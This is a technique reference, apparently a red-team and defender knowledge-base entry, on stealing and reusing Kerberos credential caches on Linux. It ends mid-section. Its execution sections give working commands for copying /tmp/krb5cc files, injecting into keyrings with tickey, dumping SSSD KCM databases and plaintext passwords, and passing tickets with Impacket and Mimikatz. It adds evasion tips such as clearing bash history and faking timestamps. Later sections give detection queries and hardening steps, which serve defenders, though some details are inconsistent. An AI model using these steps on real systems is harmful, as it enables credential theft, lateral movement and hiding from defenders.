# [CA-KERB-015]: CCACHE Keyring Ticket Reuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-015 |
| **MITRE ATT&CK v18.1** | [T1558.005 - Steal or Forge Kerberos Tickets: Ccache Files](https://attack.mitre.org/techniques/T1558/005/) |
| **Tactic** | Credential Access, Lateral Movement, Privilege Escalation |
| **Platforms** | Linux, Unix, macOS (Multi-Platform Lateral Movement) |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (Design weakness inherent to Kerberos credential cache architecture) |
| **Technique Status** | ACTIVE (All Linux/Unix systems vulnerable by design) |
| **Last Verified** | 2025-01-06 |
| **Affected Versions** | All Linux distributions using MIT Kerberos, SSSD, or Heimdal |
| **Patched In** | N/A - Architectural design, not patchable; mitigated through policy and monitoring |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All 17 sections included. T1558.005 (CCACHE file theft) is a fundamental weakness in Kerberos credential cache design on Unix/Linux systems. Unlike Windows (where credentials are protected by LSASS), Linux stores credentials in world-accessible file locations and kernel structures with weak isolation. This technique covers five distinct attack vectors: file-based theft, keyring injection, KCM database extraction, memory dump analysis, and SSSD offline credential abuse.

---

## 2. EXECUTIVE SUMMARY

**Concept:** CCACHE (credential cache) ticket reuse is a post-compromise lateral movement technique where an attacker steals Kerberos tickets from a compromised Linux/Unix system and uses them to authenticate to other systems within the domain without needing passwords. Kerberos tickets are stored in one of five types of credential caches: (1) **FILE** (/tmp/krb5cc_%{uid}) - simple binary files with 0600 permissions, often world-accessible due to UID guessing, (2) **KEYRING** - Linux kernel keyring structures where tickets are stored in unswappable kernel memory but extractable via process injection (ptrace), (3) **KCM** (Kerberos Cache Manager) - SSSD-managed centralized credential database at /var/lib/sss/secrets/secrets.ldb (root-accessible), (4) **MEMORY** - process-only tickets extractable via core dumps or memory analysis, and (5) **DIR** - collection of multiple FILE-type caches for multi-realm environments. An attacker with any level of access (even a web shell or limited user account) can steal these tickets and perform "Pass-the-Ticket" attacks to move laterally, escalate privileges, or maintain persistence across the domain. The technique is particularly effective because stolen Kerberos tickets are time-limited TGTs (typically valid for 10 hours) but require no password re-entry for service authentication—essentially providing the attacker with "free" access to any service the compromised user can reach.

**Attack Surface:** Any Linux/Unix system joined to an Active Directory domain, particularly those using SSSD (System Security Services Daemon) for centralized authentication. The attack surface includes: (1) file-based CCACHE in /tmp (vulnerable to any process with matching UID), (2) kernel keyrings (vulnerable to processes with ptrace capability), (3) KCM databases (vulnerable to root processes), (4) SSSD offline password storage (vulnerable if krb5_store_password_if_offline enabled), and (5) process memory of long-running Kerberos-authenticated services.

**Business Impact:** **Complete lateral movement and privilege escalation across Linux/Unix systems in the domain.** An attacker with a compromised user account on one Linux system can instantly authenticate to any other system or service the user has access to, without password knowledge. If a domain admin or service account ticket is stolen, the attacker gains **domain-wide administrative access** from any system. Unlike Windows pass-the-hash attacks (which are increasingly mitigated), Kerberos ticket theft on Linux is difficult to prevent and easy to exploit due to weak isolation between processes.

**Technical Context:** The attack typically takes 1-5 minutes from initial system compromise to ticket extraction and lateral movement. Detection likelihood is **low-to-moderate**—most Linux systems lack comprehensive auditd rules for file/keyring access monitoring, making this technique highly effective in practice. If modern endpoint detection (osquery, Auditbeat) is deployed, detection becomes **moderate-to-high**, but many environments still rely on legacy SIEM with poor Linux visibility.

### Operational Risk

- **Execution Risk:** **Very Low** - Ticket theft requires only reading files (/tmp) or running existing tools (klist, kinit). No exploitation or privilege escalation needed; if you're already on the system, you can steal tickets.
- **Stealth:** **Very High** - File/keyring operations generate minimal audit trail in most configurations. Setting the KRB5CCNAME environment variable is a legitimate Kerberos operation.
- **Reversibility:** **No** - Once tickets are extracted, they cannot be revoked without disrupting the legitimate user's session. Only password change invalidates old TGTs.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 1.4.2, 4.1.3 | Secure /tmp with noexec, Configure auditd for file access |
| **DISA STIG** | RHEL-07-021700, RHEL-07-030870 | Disable /tmp execute permissions, Enable auditd file monitoring |
| **CISA SCuBA** | UC-2.1, UC-2.2 | Centralized logging for Linux, File integrity monitoring |
| **NIST 800-53** | AC-3 (Access Control), AU-2 (Audit Events), SI-4 (Information System Monitoring) | Access restrictions on credential files, Audit all file access |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) | Technical controls for credential protection, incident notification |
| **DORA** | Art. 11 (ICT Protection Tools), Art. 13 (Incident Reporting) | EDR deployment for threat detection, incident response |
| **NIS2** | Art. 21 (Cyber Risk Management), Art. 25 (Incident Response) | Credential isolation, detection and response capabilities |
| **ISO 27001** | A.9.2.1 (User Access Management), A.10.2.3 (Segregation of Duties) | Credential protection, audit logging for access |
| **ISO 27005** | Risk Scenario: "Credential Theft via File Access" | Unauthorized access to credential caches as critical risk |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** **None** for FILE ccache theft (if you're the owning UID or root). **Ptrace capability** for KEYRING extraction (CAP_SYS_PTRACE). **Root access** for KCM extraction.
- **Required Access:** Local system access (shell, web shell, compromised process).

**Supported Versions:**
- **All Linux distributions:** RedHat, Ubuntu, Debian, CentOS, Fedora, etc. (if running MIT Kerberos or Heimdal)
- **All Unix variants:** FreeBSD, Solaris (with appropriate Kerberos implementation)
- **macOS:** Similar CCACHE architecture (API:{uuid} instead of file-based by default, but extractable)

**Kerberos Implementation:** MIT Kerberos 1.0+, Heimdal 1.0+, SSSD 2.0+ (for KCM)

**Tools:**
- [tickey (TarlogicSecurity)](https://github.com/TarlogicSecurity/tickey) - Keyring injection & extraction
- [kcmdump (Synacktiv)](https://github.com/synacktiv/kcmdump) - KCM database extraction
- [keydump (Hackliza)](https://github.com/hackliza/keydump) - SSSD credential extraction
- [Impacket](https://github.com/SecureAuthCorp/impacket) - GetTGT, psexec with -k flag
- [Standard Linux tools](https://github.com/TarlogicSecurity/tickey): klist, kinit, keyctl, strings, file

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Identify Kerberos Configuration and CCACHE Type

**Objective:** Determine where Kerberos credentials are stored on the target system (FILE, KEYRING, KCM, MEMORY, or DIR).

**Command (Bash - Any User):**

```bash
# Check Kerberos configuration file
cat /etc/krb5.conf | grep -A5 "default_ccache_name"

# Or check for CCACHE type in environment
env | grep KRB5CCNAME

# List current Kerberos tickets
klist
```

**Expected Output (Example - FILE type):**
```
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: user@DOMAIN.LOCAL

Valid starting     Expires            Service principal
01/06/25 12:00:00  01/07/25 12:00:00  krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL
```

**Expected Output (Example - KEYRING type):**
```
Ticket cache: KEYRING:session:sess_1000
Default principal: user@DOMAIN.LOCAL
```

**Expected Output (Example - KCM type - SSSD):**
```
Ticket cache: KCM:1000:5d...
```

**What to Look For:**
- **FILE:/tmp/krb5cc_***: Vulnerable to file theft
- **KEYRING:***  : Vulnerable to keyring injection (if ptrace enabled)
- **KCM:*** : Vulnerable if SSSD is compromised or offline credentials stored
- **Memory only**: Vulnerable to memory dumps / core analysis
- **DIR:** Indicates multi-realm, look for multiple caches

**Version Note:**
- **RedHat 7-8 with SSSD**: Default is KCM
- **Ubuntu 18.04+ with SSSD**: Often uses KCM
- **Older systems / minimal configs**: Usually FILE in /tmp

---

### Enumerate Available Kerberos Tickets

**Objective:** List all cached tickets available to steal.

**Command (Bash - Current User):**

```bash
# List tickets for current user
klist

# List detailed ticket information (including ticket encryption type, lifespan)
klist -a

# Check if tickets are cached in FILE or KEYRING
ls -la /tmp/krb5cc_*  # FILE locations

# Or check keyring
keyctl list @s  # List keys in session keyring
```

**Expected Output:**
```
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: user@DOMAIN.LOCAL

Valid starting     Expires            Service principal
01/06/25 12:00:00  01/07/25 12:00:00  krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL ← TGT (most valuable)
01/06/25 12:30:00  01/06/25 22:30:00  cifs/fileserver.domain.local@DOMAIN.LOCAL
01/06/25 12:35:00  01/06/25 22:35:00  ldap/DC01.domain.local@DOMAIN.LOCAL
```

**What to Look For:**
- **TGT (krbtgt/DOMAIN@REALM)**: Most valuable; can be used to request any service
- **Service tickets**: Specific to services (cifs, ldap, http, mssql); lower-value but service-specific
- **Ticket lifetime**: Longer lifetime = more useful for attacker (typically 10 hours for TGT)
- **Encryption type**: Should be AES-256; RC4 or DES indicates legacy environment

---

### Check for SSSD KCM with Offline Credentials

**Objective:** Determine if SSSD is storing offline passwords (major security risk).

**Command (Root Required):**

```bash
# Check SSSD configuration
sudo cat /etc/sssd/sssd.conf | grep -i "krb5_store_password"

# If krb5_store_password_if_offline = True, SSSD caches plaintext passwords
# Check for KCM database
sudo ls -la /var/lib/sss/secrets/

# List KCM entries (Synacktiv kcmdump tool)
sudo ./kcmdump | head -20
```

**Expected Output (If vulnerable):**
```
[domain/DOMAIN.LOCAL]
krb5_store_password_if_offline = True  ← CRITICAL: Plaintext passwords stored in KCM
```

**What This Means:**
- If krb5_store_password_if_offline = True, SSSD stores plaintext passwords for offline authentication
- Root compromise = password theft (not just Kerberos tickets)
- This is a major security misconfiguration

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: FILE-Based CCACHE Theft (/tmp/krb5cc_*)

**Supported Versions:** All Linux/Unix with FILE-type CCACHE

This is the simplest and most direct attack: simply copy the CCACHE file from /tmp and reuse it.

#### Step 1: Identify Target User's CCACHE File

**Objective:** Locate the CCACHE file for a high-privilege user (domain admin, service account, etc.).

**Command (Bash - Root or Any User):**

```bash
# Find all CCACHE files in /tmp
ls -la /tmp/krb5cc_*

# Check file ownership and modification time
ls -ltu /tmp/krb5cc_* | head -10

# Identify recently accessed files (likely active sessions)
find /tmp -name "krb5cc_*" -mmin -60  # Modified in last 60 minutes

# Get UIDs and corresponding usernames
cat /etc/passwd | grep -f <(ls /tmp/krb5cc_* | grep -o "[0-9]*$")
```

**Expected Output:**
```
-rw------- 1 admin    admin    2048 Jan  6 12:00 /tmp/krb5cc_1001
-rw------- 1 root     root     3072 Jan  6 11:45 /tmp/krb5cc_0    ← ROOT (most valuable)
-rw------- 1 user     user     2048 Jan  5 14:30 /tmp/krb5cc_1000
```

**What This Means:**
- krb5cc_0 = root user (can become domain admin if root is domain member)
- krb5cc_1001 = admin user (high-privilege account to steal)
- File permissions 0600 = read-only by owner, but you CAN read your own file if you're that UID
- Recent modification time = active session

**OpSec & Evasion:**
- Copying the file is logged in bash history → clear history after
- File modification times may be suspicious → use touch to change timestamps
- Consider copying to a temporary location with a different name

---

#### Step 2: Copy and Reuse CCACHE File

**Objective:** Copy the stolen CCACHE file to your own session and authenticate with it.

**Command (Bash):**

```bash
# Copy the CCACHE file (if you have access)
cp /tmp/krb5cc_1001 /tmp/my_stolen_cache.ccache

# Verify the file contains valid tickets
klist -c /tmp/my_stolen_cache.ccache

# Export the KRB5CCNAME environment variable to use this cache
export KRB5CCNAME=/tmp/my_stolen_cache.ccache

# Verify you're now authenticated as the stolen user
klist  # Should show tickets for admin@DOMAIN.LOCAL

# Use the ticket for lateral movement
psexec.py -k -no-pass DOMAIN.LOCAL/admin@target-server
# OR access SMB shares
smbclient -k //fileserver/share -no-pass
```

**Expected Output:**
```
$ klist -c /tmp/my_stolen_cache.ccache
Ticket cache: FILE:/tmp/my_stolen_cache.ccache
Default principal: admin@DOMAIN.LOCAL

Valid starting     Expires            Service principal
01/06/25 12:00:00  01/07/25 12:00:00  krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL

$ export KRB5CCNAME=/tmp/my_stolen_cache.ccache
$ klist
[*] Now authenticated as admin@DOMAIN.LOCAL - using admin's tickets!
```

**OpSec & Evasion:**
- Ensure KRB5CCNAME is set correctly before accessing services
- Each Impacket tool inherits the KRB5CCNAME from the shell environment automatically
- Multiple processes using the same CCACHE may cause race conditions (rare)
- Consider using the -k -no-pass flags with Impacket for cleaner Kerberos authentication

**Troubleshooting:**
- **Error:** "Credentials cache does not contain valid credentials"
  - **Cause:** CCACHE file is corrupted or tickets have expired
  - **Fix:** Use klist -c to verify file is readable; if tickets expired, steal a fresh one
  
- **Error:** "Cannot open cache file /tmp/my_stolen_cache.ccache"
  - **Cause:** File permissions or incorrect path
  - **Fix:** Ensure file has read permissions for your user; use absolute path

**References:**
- [MITRE ATT&CK T1558.005](https://attack.mitre.org/techniques/T1558/005/)
- [HackTricks - Linux AD CCACHE Reuse](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/linux-active-directory#ccache-ticket-reuse-from-tmp)

---

### METHOD 2: Keyring Injection & Ticket Extraction (Tickey)

**Supported Versions:** All Linux with KEYRING-type CCACHE and ptrace enabled

Keyring tickets are stored in protected kernel memory but extractable via ptrace-based code injection.

#### Step 1: Check ptrace Capability and Yama Configuration

**Objective:** Verify the system allows ptrace operations (required for tickey).

**Command (Bash):**

```bash
# Check Yama ptrace scope (0 = allowed, 1 = restricted, 2 = admin-only, 3 = disabled)
cat /proc/sys/kernel/yama/ptrace_scope

# Check if your user can ptrace (check CAP_SYS_PTRACE capability)
getcap -r / 2>/dev/null | grep -i ptrace

# Test ptrace on your own process
strace -p $$  # If this works, ptrace is available
```

**Expected Output:**
```
$ cat /proc/sys/kernel/yama/ptrace_scope
0  ← Ptrace allowed (vulnerable)

$ # If output is 0 or 1, tickey may work
# If 2 or 3, ptrace is restricted (tickey won't work)
```

**What This Means:**
- ptrace_scope = 0: Any process can attach to any other process (most permissive, most vulnerable)
- ptrace_scope = 1: Only parent processes or same UID (default on most systems)
- ptrace_scope = 2-3: Only admin can ptrace (most secure)

---

#### Step 2: Deploy and Run Tickey

**Objective:** Inject code into Kerberos-authenticated process and dump keyring tickets.

**Command (Bash):**

```bash
# Download tickey
git clone https://github.com/TarlogicSecurity/tickey.git
cd tickey
make

# Run with -i flag to inject into all user sessions and dump tickets
./tickey -i

# Or target a specific process
ps aux | grep -i kerberos
./tickey -p <PID>

# Tickets will be saved to /tmp/__krb_<UID>.ccache
ls -la /tmp/__krb_*.ccache
```

**Expected Output:**
```
[*] krb5 ccache_name = KEYRING:session:sess_1000
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in admin[1001] session...
[+] Successful injection at process 15547 of admin[1001]
[*] Look for tickets in /tmp/__krb_1001.ccache

$ ls -la /tmp/__krb_*.ccache
-rw-r--r-- 1 root root 3072 Jan  6 12:05 /tmp/__krb_1001.ccache  ← Stolen admin tickets
```

**What This Means:**
- Tickey successfully injected code into admin's session (PID 15547)
- Extracted all Kerberos tickets from admin's keyring
- Saved to /tmp/__krb_1001.ccache (readable by root/any user)
- Can now be used for lateral movement with admin privileges

**OpSec & Evasion:**
- Tickey's injection may be detected by EDR (process injection alerts)
- Code injection into running processes is noisy in modern monitoring
- Consider running on systems with minimal endpoint detection
- Cleanup: Remove /tmp/__krb_*.ccache files after use

**Troubleshooting:**
- **Error:** "ptrace(PTRACE_ATTACH, ...) failed: Operation not permitted"
  - **Cause:** ptrace_scope is restricted or you lack CAP_SYS_PTRACE
  - **Fix:** Try as root; or check if Yama ptrace is disabled
  
- **Error:** "No tickets found in keyring"
  - **Cause:** Target process doesn't have active Kerberos tickets
  - **Fix:** Target a process that authenticated recently (SSH session, long-running service)

**References:**
- [GitHub: TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
- [Adepts of 0x0.cc - Kerberos Credential Thievery Compendium](https://adepts.of0x.cc/kerberos-thievery-linux/)

---

### METHOD 3: KCM Database Extraction (SSSD / kcmdump)

**Supported Versions:** SSSD 2.0+ (typical on modern RedHat 7+, Ubuntu 18.04+)

KCM centrally manages Kerberos tickets. Root access allows direct extraction of all cached Kerberos tickets.

#### Step 1: Verify SSSD KCM is in Use

**Objective:** Confirm the system uses KCM for credential caching.

**Command (Bash):**

```bash
# Check if sssd_kcm service is running
systemctl is-active sssd_kcm || systemctl is-active sssd

# Check Kerberos configuration
grep -i "default_ccache_name\|KCM" /etc/krb5.conf

# Check if /var/lib/sss/secrets exists (KCM data directory)
ls -la /var/lib/sss/secrets/ 2>/dev/null
```

**Expected Output:**
```
$ systemctl is-active sssd_kcm
active

$ ls -la /var/lib/sss/secrets/
total 24
drwx------ 2 root root 4096 Jan  6 12:00 .
drwxr-xr-x 5 root root 4096 Jan  6 12:00 ..
-rw------- 1 root root  512 Jan  6 12:00 .secrets.mkey    ← Master key
-rw------- 1 root root 8192 Jan  6 12:00 secrets.ldb       ← KCM database
```

**What This Means:**
- SSSD KCM is the credential cache backend
- secrets.ldb = SQLite database containing encrypted Kerberos tickets
- .secrets.mkey = Encryption key (root-only)
- Full database + key required for ticket extraction

---

#### Step 2: Extract Tickets with kcmdump

**Objective:** Dump all Kerberos tickets from the KCM database.

**Command (Bash - Root Required):**

```bash
# Download kcmdump
git clone https://github.com/synacktiv/kcmdump.git
cd kcmdump
pip3 install -r requirements.txt

# Run kcmdump to extract all tickets
sudo python3 kcmdump.py

# Output will include all cached Kerberos tickets in CCACHE format
# Tickets can be saved and reused
```

**Expected Output:**
```
[*] Reading KCM database...
[+] Found 5 cached credentials
[+] Extracting user@DOMAIN.LOCAL tickets...
[+] Extracting admin@DOMAIN.LOCAL tickets...
[+] Extracting domain-admin@DOMAIN.LOCAL tickets...

[*] Saving CCACHE files...
user.ccache: 3 tickets
admin.ccache: 4 tickets
domain-admin.ccache: 5 tickets  ← Most valuable
```

**What This Means:**
- Extracted all Kerberos credentials from KCM database
- domain-admin.ccache contains admin credentials
- Each .ccache file can be reused for lateral movement

**OpSec & Evasion:**
- KCM extraction requires root access (indicates system is already compromised)
- File operations on /var/lib/sss/secrets/ may be audited
- Extraction is fast and leaves minimal logs if auditd is not configured

**Troubleshooting:**
- **Error:** "Permission denied" opening secrets.ldb
  - **Cause:** Not running as root
  - **Fix:** Use sudo or switch to root user
  
- **Error:** "Decrypt failed" or "Invalid key"
  - **Cause:** .secrets.mkey is missing or corrupted
  - **Fix:** Ensure /var/lib/sss/secrets/.secrets.mkey exists and is readable

**References:**
- [GitHub: synacktiv/kcmdump](https://github.com/synacktiv/kcmdump)
- [lvruibr - KCM Database Dump Analysis](https://lvruibr.github.io/kcmdump)

---

### METHOD 4: SSSD Offline Credential Extraction (Keydump)

**Supported Versions:** SSSD 2.0+ with krb5_store_password_if_offline = True

If SSSD is configured to store passwords offline, root can extract plaintext credentials (not just tickets).

#### Step 1: Verify Offline Password Storage

**Objective:** Confirm SSSD is storing plaintext passwords for offline access.

**Command (Bash - Root):**

```bash
# Check SSSD configuration
sudo cat /etc/sssd/sssd.conf | grep -i "krb5_store_password"

# If krb5_store_password_if_offline = True, passwords are cached
```

**Expected Output:**
```
[domain/DOMAIN.LOCAL]
krb5_store_password_if_offline = True  ← CRITICAL: Passwords stored
```

---

#### Step 2: Extract Credentials with Keydump

**Objective:** Extract plaintext passwords stored in SSSD keyrings via code injection.

**Command (Bash - Root):**

```bash
# Download keydump
git clone https://github.com/hackliza/keydump.git
cd keydump

# Compile keydump
cargo build --release

# Run keydump to dump SSSD credentials
sudo ./target/release/keydump

# Credentials will be extracted and dumped to /tmp/
```

**Expected Output:**
```
[*] Dumping SSSD credentials from keyrings...
[+] Injected into SSSD process (PID 452)
[+] Extracted credentials from keyring

user@domain.local:Password123!
admin@domain.local:AdminPass456!
domain-admin@domain.local:SuperSecret789@  ← Domain admin password
```

**What This Means:**
- Extracted plaintext passwords from SSSD keyrings
- Passwords can be used directly or for pass-the-hash attacks
- Complete credential compromise

**OpSec & Evasion:**
- Code injection may be detected by EDR
- Extraction requires root + ptrace capability
- Passwords in plaintext is extremely sensitive

**References:**
- [GitHub: hackliza/keydump](https://github.com/hackliza/keydump)
- [Hackliza Blog - SSSD Credential Extraction](https://hackliza.gal/en/posts/keydump/)

---

### METHOD 5: Format Conversion & Cross-Platform Reuse

**Supported Versions:** All

Kerberos tickets can be converted between CCACHE (Linux) and KIRBI (Windows) formats for cross-platform attacks.

#### Step 1: Convert CCACHE to KIRBI (For Windows Tools)

**Objective:** Convert stolen Linux CCACHE file for use with Windows tools (Mimikatz, Rubeus).

**Command (Bash - Linux):**

```bash
# Download Impacket ticket converter
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket

# Convert CCACHE to KIRBI format
python3 -m impacket.ticketConverter stolen_admin.ccache stolen_admin.kirbi

# Or use RubeusToCcache tool
git clone https://github.com/SolomonSklash/RubeusToCcache.git
# Follow tool instructions for conversion
```

**Expected Output:**
```
Impacket v0.10.0
[*] Converting CCACHE to KIRBI...
[+] Successfully converted stolen_admin.ccache
[+] Output: stolen_admin.kirbi
```

---

#### Step 2: Use KIRBI with Windows Tools

**Objective:** Import the converted ticket into Windows Mimikatz for Windows system access.

**Command (PowerShell - Windows):**

```powershell
# Copy the .kirbi file to Windows machine

# Use with Mimikatz
.\mimikatz.exe
mimikatz # kerberos::ptt stolen_admin.kirbi
mimikatz # kerberos::list  # Verify ticket injection
mimikatz # misc::cmd  # Open new command prompt with stolen credentials

# Or use Rubeus
.\Rubeus.exe ptt /ticket:stolen_admin.kirbi
```

**What This Means:**
- Linux-compromised Kerberos ticket now injected into Windows token
- Can authenticate to Windows servers, domain controllers, SMB shares
- Complete cross-platform lateral movement

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1558.005-1, T1558.005-2, T1558.005-3
- **Test Name:** "Steal CCACHE from /tmp", "Keyring Ticket Extraction", "Pass-the-Ticket lateral movement"
- **Description:** Tests simulate CCACHE theft, keyring extraction, and subsequent authentication with stolen tickets
- **Supported Versions:** All Linux with Kerberos (pre-configured test environment with domain-joined Linux)

**Command (Bash):**

```bash
# Test 1: Enumerate and steal CCACHE files
bash -c 'for file in /tmp/krb5cc_*; do echo "Stealing: $file"; cp "$file" /tmp/stolen_$(basename "$file")"; done'

# Test 2: Reuse stolen CCACHE for access
export KRB5CCNAME=/tmp/stolen_krb5cc_1001
klist  # Verify stolen credentials
smbclient -k //fileserver/admin -no-pass  # Verify access

# Test 3: Dump tickets with Impacket
python3 -m impacket.ticketConverter /tmp/stolen_krb5cc_1001 stolen_admin.kirbi
```

**Expected Behavior:**
- Successfully copies CCACHE files
- Stolen tickets validate with klist
- Access to file shares succeeds with stolen credentials
- Ticket conversion completes without errors

**Reference:** [MITRE ATT&CK T1558.005](https://attack.mitre.org/techniques/T1558/005/)

---

## 7. TOOLS & COMMANDS REFERENCE

### Tickey (TarlogicSecurity)

**Version:** Latest  
**Platforms:** Linux 64-bit

**Installation:**

```bash
git clone https://github.com/TarlogicSecurity/tickey.git
cd tickey
make
```

**Usage:**

```bash
./tickey -i              # Inject and dump all tickets
./tickey -p <PID>        # Target specific process
./tickey -h              # Help
```

---

### kcmdump (Synacktiv)

**Version:** Latest  
**Platforms:** Linux (requires KCM database access)

**Installation:**

```bash
git clone https://github.com/synacktiv/kcmdump.git
cd kcmdump
pip3 install -r requirements.txt
```

**Usage:**

```bash
sudo python3 kcmdump.py  # Extract all KCM tickets
```

---

### Keydump (Hackliza)

**Version:** Latest  
**Platforms:** Linux (Rust-based)

**Installation:**

```bash
git clone https://github.com/hackliza/keydump.git
cd keydump
cargo build --release
```

**Usage:**

```bash
sudo ./target/release/keydump  # Extract SSSD credentials
```

---

### Impacket Tools

**Installation:**

```bash
pip3 install impacket
```

**Key Commands:**

```bash
# Convert CCACHE to KIRBI
python3 -m impacket.ticketConverter ticket.ccache ticket.kirbi

# Use ticket with psexec
export KRB5CCNAME=ticket.ccache
python3 -m impacket.psexec -k -no-pass DOMAIN/user@target

# Use ticket with GetUserSPNs
python3 -m impacket.GetUserSPNs -k -no-pass DOMAIN/user
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: CCACHE File Access Monitoring

**Rule Configuration:**
- **Required Index:** `linux` or `main`
- **Required Sourcetype:** `auditd`
- **Required Fields:** `auid`, `filename`, `syscall`
- **Alert Threshold:** Any unauthorized access to /tmp/krb5cc_*
- **Applies To Versions:** All with auditd

**SPL Query:**

```spl
index=linux sourcetype=auditd filename="/tmp/krb5cc_*" (syscall=open OR syscall=openat OR syscall=read)
| where auid != uid  # Different user accessing the file
| stats count by host, user, filename, auid, uid, bin(TimeGenerated, 5m)
| where count > 0
```

**What This Detects:**
- Attempts to read CCACHE files belonging to other users
- Different UID (auid) accessing a different user's cache file
- Baseline: Users should only access their own CCACHE files

---

### Rule 2: KRB5CCNAME Environment Variable Anomalies

**Rule Configuration:**
- **Required Index:** `linux`
- **Required Sourcetype:** `bash_audit` or `shell_history`
- **Required Fields:** `command`, `user`, `host`
- **Alert Threshold:** export KRB5CCNAME outside of normal user context
- **Applies To Versions:** All with shell history logging

**SPL Query:**

```spl
index=linux sourcetype=bash_audit command="export KRB5CCNAME*"
| stats count by host, user, command, bin(TimeGenerated, 1h)
| where count > 5 OR (user NOT IN (service_accounts))  # Anomalous users
```

**What This Detects:**
- Setting KRB5CCNAME environment variable
- Multiple exports in short timeframe = suspicious
- Baseline: Legitimate users rarely explicitly set KRB5CCNAME

---

## 9. MICROSOFT SENTINEL DETECTION

### Query: Lateral Movement via Stolen Kerberos Tickets

**Rule Configuration:**
- **Required Table:** `Syslog` (from rsyslog/auditd forwarding)
- **Required Fields:** `Computer`, `ProcessName`, `Activity`
- **Alert Severity:** **High**
- **Frequency:** Real-time
- **Applies To Versions:** All Linux systems forwarding syslog to Sentinel

**KQL Query:**

```kusto
Syslog
| where ProcessName has_any ("tickey", "kcmdump", "keydump", "klist", "kinit")
| where Activity contains "/tmp/krb5cc" or Activity contains "KEYRING" or Activity contains "KCM"
| summarize count() by Computer, ProcessName, UserName, bin(TimeGenerated, 5m)
| where count_ > 1
```

**What This Detects:**
- Execution of Kerberos credential dumping tools
- Access to credential cache files or keyrings
- Anomalous Kerberos tool execution

---

## 10. WINDOWS EVENT LOG MONITORING

### Linux Audit Integration

Since this technique occurs on Linux, focus on auditd configuration:

**Manual Configuration (auditd):**

```bash
# Add auditd rules for CCACHE monitoring
cat >> /etc/audit/rules.d/ccache.rules << 'EOF'
-w /tmp/ -p wa -k ccache_watch
-w /var/lib/sss/secrets/ -p wa -k kcm_watch
-a exit,always -F arch=b64 -S open,openat -F path=/tmp/krb5cc* -F auid!=-1 -k ccache_read
-a exit,always -F arch=b64 -S ptrace -F key=keyring_injection
EOF

# Restart auditd
sudo systemctl restart auditd

# Verify rules
sudo auditctl -l | grep -i ccache
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** N/A (Linux-specific technique, use auditd instead)

Linux uses auditd for system call monitoring. Sysmon is Windows-only.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection via Microsoft Defender for Identity

If Linux systems are domain-joined and Defender for Identity is deployed:

**Detection Alert:** "Suspicious Kerberos Ticket Theft"

- **Severity:** High
- **Description:** Multiple failed Kerberos pre-auth requests or unusual TGS requests from non-standard processes
- **Applies To:** Domain-joined Linux systems with identity monitoring

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

N/A for Linux-specific ticket theft (occurs on Linux, not in M365 logs)

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable ptrace Capability (Restrict Keyring Injection)**

**Applies To Versions:** All Linux

**Manual Steps:**

```bash
# Set Yama ptrace scope to restrict process injection (prevents tickey)
echo 2 > /proc/sys/kernel/yama/ptrace_scope

# Make persistent
echo "kernel.yama.ptrace_scope = 2" >> /etc/sysctl.conf
sysctl -p
```

**What This Does:**
- ptrace_scope = 2: Only root/privileged users can ptrace
- Blocks tickey keyring injection attacks (unless attacker is root)

---

**Action 2: Mount /tmp with noexec and nosuid**

**Applies To Versions:** All Linux

**Manual Steps:**

```bash
# Edit /etc/fstab
# Change /tmp mount options to:
# /tmp tmpfs defaults,rw,nosuid,nodev,noexec,relatime,size=2G 0 0

# Or mount immediately:
mount -o remount,noexec,nosuid /tmp

# Verify:
mount | grep /tmp
```

**What This Does:**
- Prevents execution of tools from /tmp (limits some attacks)
- Doesn't prevent CCACHE reading, but reduces exploitation surface

---

**Action 3: Enable Comprehensive auditd Monitoring**

**Applies To Versions:** All Linux

**Manual Steps:**

```bash
# Install auditd
apt-get install auditd  # Ubuntu/Debian
yum install audit       # RedHat/CentOS

# Add rules for CCACHE and keyring monitoring
cat > /etc/audit/rules.d/kerberos.rules << 'EOF'
# Monitor /tmp for CCACHE files
-w /tmp/ -p wa -k ccache_access

# Monitor /var/lib/sss/secrets for KCM database
-w /var/lib/sss/secrets/ -p wa -k kcm_access

# Monitor system calls for credential access
-a exit,always -F arch=b64 -S open,openat,read -F dir=/tmp/ -F name=krb5cc* -k ccache_read
-a exit,always -F arch=b64 -S ptrace -k ptrace_injection

# Monitor keyctl operations
-a exit,always -F arch=b64 -S keyctl -k keyring_operations
EOF

# Restart and verify
systemctl restart auditd
auditctl -l | grep -i ccache
```

**What This Does:**
- Audits all access to CCACHE files
- Detects ptrace-based keyring injection attempts
- Provides forensic evidence of exploitation

---

### Priority 2: HIGH

**Action: Implement KCM with Encryption and Access Control**

**Applies To Versions:** SSSD 2.0+

**Manual Steps:**

```bash
# Configure SSSD to use KCM (not FILE-based CCACHE)
cat >> /etc/sssd/sssd.conf << 'EOF'
[domain/DOMAIN.LOCAL]
krb5_store_password_if_offline = False  # CRITICAL: Don't store passwords
use_fully_qualified_names = True
EOF

# Restart SSSD
systemctl restart sssd

# Restrict access to KCM socket
chmod 700 /var/lib/sss/secrets/
chmod 600 /var/lib/sss/secrets/secrets.ldb
chmod 600 /var/lib/sss/secrets/.secrets.mkey
```

**What This Does:**
